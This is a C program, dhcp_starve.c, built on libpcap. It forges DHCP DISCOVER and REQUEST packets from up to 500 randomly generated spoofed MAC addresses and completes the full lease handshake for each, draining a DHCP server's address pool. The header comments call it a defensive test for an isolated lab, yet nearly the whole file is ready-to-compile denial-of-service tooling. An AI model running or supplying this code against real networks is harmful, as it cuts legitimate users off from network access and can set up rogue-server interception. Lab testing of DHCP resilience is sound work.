// dhcp_starve.c
// Defensive DHCP starvation test: serialized full 4-phase handshake
// Build: gcc -o dhcp_starve dhcp_starve.c -lpcap
// Run as root on an isolated lab network only.

#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <stdint.h>

#define IFACE "enp0s3"       // change to your interface
#define NUM 500              // how many fake clients to try
#define WAIT_OFFER 2         // seconds to wait for offer/ack
#define SLEEP_USEC 100000    // microseconds between clients

#define ETH_HDR_LEN 14
#define IP_HDR_LEN 20
#define UDP_HDR_LEN 8
#define BOOTP_FIXED_LEN 236
#define DHCP_COOKIE_LEN 4

struct ethhdr { uint8_t h_dest[6]; uint8_t h_source[6]; uint16_t h_proto; };
struct iphdr { uint8_t ihl_ver; uint8_t tos; uint16_t tot_len; uint16_t id; uint16_t frag_off;
               uint8_t ttl; uint8_t protocol; uint16_t check; uint32_t saddr; uint32_t daddr; };
struct udphdr { uint16_t source; uint16_t dest; uint16_t len; uint16_t check; };
struct bootp {
    uint8_t op, htype, hlen, hops;
    uint32_t xid;
    uint16_t secs, flags;
    uint32_t ciaddr, yiaddr, siaddr, giaddr;
    uint8_t chaddr[16], sname[64], file[128];
};

static uint16_t ip_checksum(const void *vdata, size_t length) {
    const uint8_t *data = vdata; uint32_t acc = 0;
    for (size_t i = 0; i + 1 < length; i += 2) { uint16_t w = (data[i] << 8) | data[i+1]; acc += w; if(acc>0xffff) acc-=0xffff; }
    if(length & 1){ uint16_t w = data[length-1]<<8; acc+=w; if(acc>0xffff) acc-=0xffff; }
    return ~((uint16_t)acc);
}

void rand_mac(uint8_t mac[6]) { mac[0]=0x02; for(int i=1;i<6;i++) mac[i]=rand()&0xff; }
void mac_to_str(const uint8_t mac[6], char *out, size_t outlen) { snprintf(out,outlen,"%02x:%02x:%02x:%02x:%02x:%02x",mac[0],mac[1],mac[2],mac[3],mac[4],mac[5]); }
uint32_t parse_ip(const char *s){ struct in_addr a; if(inet_aton(s,&a)) return a.s_addr; return 0; }

int build_discover(uint8_t *buf, size_t buf_sz, const uint8_t src_mac[6], uint32_t xid){
    if(buf_sz<1500) return -1; size_t offset=0;
    struct ethhdr eth; memset(&eth,0,sizeof(eth)); memset(eth.h_dest,0xff,6); memcpy(eth.h_source,src_mac,6); eth.h_proto=htons(0x0800);
    memcpy(buf+offset,&eth,sizeof(eth)); offset+=sizeof(eth);

    struct iphdr ip; memset(&ip,0,sizeof(ip)); ip.ihl_ver=(4<<4)|(IP_HDR_LEN/4); ip.tos=0;
    uint8_t dhcp_options[]={53,1,1,55,5,1,3,6,15,51,255};
    uint8_t cookie[4]={0x63,0x82,0x53,0x63};
    size_t options_len=sizeof(cookie)+sizeof(dhcp_options); size_t bootp_total=BOOTP_FIXED_LEN+options_len;
    ip.tot_len=htons(IP_HDR_LEN+UDP_HDR_LEN+bootp_total); ip.id=htons(rand()&0xffff); ip.frag_off=htons(0); ip.ttl=64; ip.protocol=17;
    ip.check=0; ip.saddr=inet_addr("0.0.0.0"); ip.daddr=inet_addr("255.255.255.255");
    memcpy(buf+offset,&ip,sizeof(ip)); offset+=sizeof(ip);

    struct udphdr udp; udp.source=htons(68); udp.dest=htons(67); udp.len=htons(UDP_HDR_LEN+bootp_total); udp.check=0;
    memcpy(buf+offset,&udp,sizeof(udp)); offset+=sizeof(udp);

    struct bootp bp; memset(&bp,0,sizeof(bp)); bp.op=1; bp.htype=1; bp.hlen=6; bp.hops=0; bp.xid=htonl(xid); bp.secs=htons(0);
    bp.flags=htons(0x8000); memcpy(bp.chaddr,src_mac,6); memcpy(buf+offset,&bp,sizeof(bp)); offset+=sizeof(bp);

    memcpy(buf+offset,cookie,sizeof(cookie)); offset+=sizeof(cookie);
    memcpy(buf+offset,dhcp_options,sizeof(dhcp_options)); offset+=sizeof(dhcp_options);

    struct iphdr *ip_in_buf=(struct iphdr*)(buf+ETH_HDR_LEN); ip_in_buf->check=0; ip_in_buf->check=htons(ip_checksum((uint8_t*)ip_in_buf,IP_HDR_LEN));
    return offset;
}

int build_request(uint8_t *buf,size_t buf_sz,const uint8_t src_mac[6],uint32_t xid,uint32_t requested_ip,uint32_t server_id){
    if(buf_sz<1500) return -1; size_t offset=0;
    struct ethhdr eth; memset(&eth,0,sizeof(eth)); memset(eth.h_dest,0xff,6); memcpy(eth.h_source,src_mac,6); eth.h_proto=htons(0x0800);
    memcpy(buf+offset,&eth,sizeof(eth)); offset+=sizeof(eth);

    struct iphdr ip; memset(&ip,0,sizeof(ip)); ip.ihl_ver=(4<<4)|(IP_HDR_LEN/4); ip.tos=0;
    uint8_t dhcp_options[256]; size_t pos=0;
    dhcp_options[pos++]=53; dhcp_options[pos++]=1; dhcp_options[pos++]=3; // Request
    dhcp_options[pos++]=50; dhcp_options[pos++]=4; memcpy(&dhcp_options[pos],&requested_ip,4); pos+=4;
    dhcp_options[pos++]=54; dhcp_options[pos++]=4; memcpy(&dhcp_options[pos],&server_id,4); pos+=4;
    dhcp_options[pos++]=55; dhcp_options[pos++]=5; dhcp_options[pos++]=1; dhcp_options[pos++]=3; dhcp_options[pos++]=6; dhcp_options[pos++]=15; dhcp_options[pos++]=51;
    dhcp_options[pos++]=255;
    uint8_t cookie[4]={0x63,0x82,0x53,0x63};
    size_t options_len=sizeof(cookie)+pos; size_t bootp_total=BOOTP_FIXED_LEN+options_len;
    ip.tot_len=htons(IP_HDR_LEN+UDP_HDR_LEN+bootp_total); ip.id=htons(rand()&0xffff); ip.frag_off=htons(0); ip.ttl=64; ip.protocol=17;
    ip.check=0; ip.saddr=inet_addr("0.0.0.0"); ip.daddr=inet_addr("255.255.255.255"); memcpy(buf+offset,&ip,sizeof(ip)); offset+=sizeof(ip);

    struct udphdr udp; udp.source=htons(68); udp.dest=htons(67); udp.len=htons(UDP_HDR_LEN+bootp_total); udp.check=0; memcpy(buf+offset,&udp,sizeof(udp)); offset+=sizeof(udp);

    struct bootp bp; memset(&bp,0,sizeof(bp)); bp.op=1; bp.htype=1; bp.hlen=6; bp.hops=0; bp.xid=htonl(xid); bp.secs=htons(0);
    bp.flags=htons(0x8000); memcpy(bp.chaddr,src_mac,6); memcpy(buf+offset,&bp,sizeof(bp)); offset+=sizeof(bp);

    memcpy(buf+offset,cookie,sizeof(cookie)); offset+=sizeof(cookie);
    memcpy(buf+offset,dhcp_options,pos); offset+=pos;

    struct iphdr *ip_in_buf=(struct iphdr*)(buf+ETH_HDR_LEN); ip_in_buf->check=0; ip_in_buf->check=htons(ip_checksum((uint8_t*)ip_in_buf,IP_HDR_LEN));
    return offset;
}

int parse_offer(const uint8_t *pkt,int pkt_len,uint32_t want_xid,uint32_t *offered_ip,uint32_t *server_id){
    if(pkt_len<ETH_HDR_LEN+IP_HDR_LEN+UDP_HDR_LEN+44) return 0;
    const uint8_t *p=pkt; p+=ETH_HDR_LEN;
    const struct iphdr *ip=(const struct iphdr*)p; int ip_hdr_len=(ip->ihl_ver&0x0f)*4; p+=ip_hdr_len;
    const struct udphdr *udp=(const struct udphdr*)p; p+=UDP_HDR_LEN;
    const uint8_t *bootp_start=p;
    uint32_t xid_net; memcpy(&xid_net,bootp_start+4,4); if(ntohl(xid_net)!=want_xid) return 0;
    if(offered_ip) memcpy(offered_ip,bootp_start+16,4); // yiaddr

    const uint8_t *opts=bootp_start+BOOTP_FIXED_LEN+DHCP_COOKIE_LEN; const uint8_t *opts_end=pkt+pkt_len;
    const uint8_t *q=opts; int found_msgtype=0,is_offer=0; uint32_t serverid=0;
    while(q<opts_end){ uint8_t code=*q++; if(code==0xff) break; if(code==0x00) continue; if(q>=opts_end) break; uint8_t len=*q++; if(q+len>opts_end) break;
        if(code==53&&len==1){ uint8_t mt=*q; found_msgtype=1; if(mt==2) is_offer=1; } 
        else if(code==54&&len==4){ memcpy(&serverid,q,4); } q+=len; }
    if(found_msgtype&&is_offer){ if(server_id) *server_id=serverid; return 1; } return 0;
}

int parse_ack(const uint8_t *pkt,int pkt_len,uint32_t want_xid){
    if(pkt_len<ETH_HDR_LEN+IP_HDR_LEN+UDP_HDR_LEN+44) return 0;
    const uint8_t *p=pkt; p+=ETH_HDR_LEN;
    const struct iphdr *ip=(const struct iphdr*)p; int ip_hdr_len=(ip->ihl_ver&0x0f)*4; p+=ip_hdr_len;
    const struct udphdr *udp=(const struct udphdr*)p; p+=UDP_HDR_LEN;
    const uint8_t *bootp_start=p; uint32_t xid_net; memcpy(&xid_net,bootp_start+4,4); if(ntohl(xid_net)!=want_xid) return 0;

    const uint8_t *opts=bootp_start+BOOTP_FIXED_LEN+DHCP_COOKIE_LEN; const uint8_t *opts_end=pkt+pkt_len;
    const uint8_t *q=opts; while(q<opts_end){ uint8_t code=*q++; if(code==0xff) break; if(code==0x00) continue; if(q>=opts_end) break;
        uint8_t len=*q++; if(q+len>opts_end) break; if(code==53&&len==1&&*q==5) return 1; q+=len; }
    return 0;
}

int sniff_packet(pcap_t *handle,uint32_t xid,uint32_t *offered_ip,uint32_t *server_id,int wait_seconds,int verbose,int check_ack){
    struct pcap_pkthdr *header; const uint8_t *packet; time_t start=time(NULL);
    while(1){
        int res=pcap_next_ex(handle,&header,&packet);
        if(res==1){
            uint32_t oip=0,sid=0;
            int matched=check_ack ? parse_ack(packet,header->caplen,xid) : parse_offer(packet,header->caplen,xid,&oip,&sid);
            if(verbose) printf("Captured packet xid=0x%x caplen=%d\n",xid,header->caplen);
            if(matched){
                if(offered_ip) *offered_ip=oip;
                if(server_id) *server_id=sid;
                return 1;
            }
        } else if(res==-1){ fprintf(stderr,"pcap_next_ex error: %s\n",pcap_geterr(handle)); return 0; }
        if(time(NULL)-start>=wait_seconds) return 0;
    }
}

int main(int argc,char **argv){
    int verbose=0; if(argc>1 && strcmp(argv[1],"-v")==0) verbose=1;
    srand(time(NULL)^getpid());
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *pcap=pcap_open_live(IFACE,65536,1,1000,errbuf);
    if(!pcap){ fprintf(stderr,"pcap_open_live failed: %s\n",errbuf); return 1; }
    struct bpf_program fp; const char *filter_exp="udp and src port 67 and dst port 68";
    if(pcap_compile(pcap,&fp,filter_exp,1,PCAP_NETMASK_UNKNOWN)==-1 || pcap_setfilter(pcap,&fp)==-1)
        fprintf(stderr,"Warning: failed to set filter\n");

    printf("Starting defensive DHCP test on iface %s\n",IFACE);
    for(int i=0;i<NUM;i++){
        uint8_t fake_mac[6]; rand_mac(fake_mac); uint32_t xid=(uint32_t)(rand()&0x7fffffff);
        char macs[64]; mac_to_str(fake_mac,macs,sizeof(macs));

        uint8_t pktbuf[1600];
        int pktlen=build_discover(pktbuf,sizeof(pktbuf),fake_mac,xid);
        if(pktlen<0) continue;
        if(pcap_inject(pcap,pktbuf,pktlen)==-1) fprintf(stderr,"pcap_inject DISCOVER failed\n");
        if(verbose) printf("Sent DISCOVER xid=0x%x\n",xid);

        uint32_t offered_ip=0,server_id=0;
        if(!sniff_packet(pcap,xid,&offered_ip,&server_id,WAIT_OFFER,verbose,0)){
            printf("[%d/%d] No offer for %s\n",i+1,NUM,macs); continue;
        }

        char ipstr[INET_ADDRSTRLEN],serverstr[INET_ADDRSTRLEN];
        struct in_addr addr;
        addr.s_addr=offered_ip; inet_ntop(AF_INET,&addr,ipstr,sizeof(ipstr));
        addr.s_addr=server_id; inet_ntop(AF_INET,&addr,serverstr,sizeof(serverstr));
        printf("[%d/%d] Offer: %s from %s (mac %s)\n",i+1,NUM,ipstr,serverstr,macs);

        pktlen=build_request(pktbuf,sizeof(pktbuf),fake_mac,xid,offered_ip,server_id);
        if(pktlen>0){ pcap_inject(pcap,pktbuf,pktlen); if(verbose) printf("Sent REQUEST xid=0x%x\n",xid); }

        if(!sniff_packet(pcap,xid,NULL,NULL,WAIT_OFFER,verbose,1)){
            printf("[%d/%d] No ACK for %s\n",i+1,NUM,macs); continue;
        }

        printf("[%d/%d] Completed DHCP transaction for %s\n",i+1,NUM,macs);
        usleep(SLEEP_USEC);
    }
    pcap_close(pcap); return 0;
}
